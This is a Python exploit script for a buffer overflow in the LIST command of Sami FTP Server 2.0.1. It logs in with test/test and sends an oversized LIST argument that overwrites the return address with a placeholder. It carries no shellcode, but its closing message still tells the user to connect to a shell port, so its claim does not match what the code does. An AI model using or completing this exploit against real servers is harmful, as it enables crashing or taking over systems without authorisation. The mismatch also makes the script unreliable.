#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Exploit Title: Sami FTP LIST buffer overflow
# Date: 27 Feb 2013
# Exploit Author: superkojiman - http://www.techorganic.com
# Vendor Homepage: http://www.karjasoft.com/old.php
# Version: Sami FTP Server 2.0.1
# Tested on: Windows XP Pro SP1, English
#            Windows XP Pro SP2, English
#
# Description: 
# A buffer overflow is triggered when a long LIST command is sent to the 
# server and the user views the Log tab. 
#

from socket import *
import struct, sys

IP = sys.argv[1]

buf =  "A" * 216 + "BBBB"

#Conexção ao servidor de FTP
s = socket(AF_INET, SOCK_STREAM)
s.connect((IP,21))
print s.recv(1024)

s.send("USER test\r\n")
print s.recv(1024)

s.send("PASS test\r\n")
print s.recv(1024)

print "[+] sending payload of size", len(buf)
s.send("LIST " + buf + "\r\n")
print s.recv(1024)

s.close()
print "[+] sent. Connect to %s on port 28876" % (sys.argv[1],)
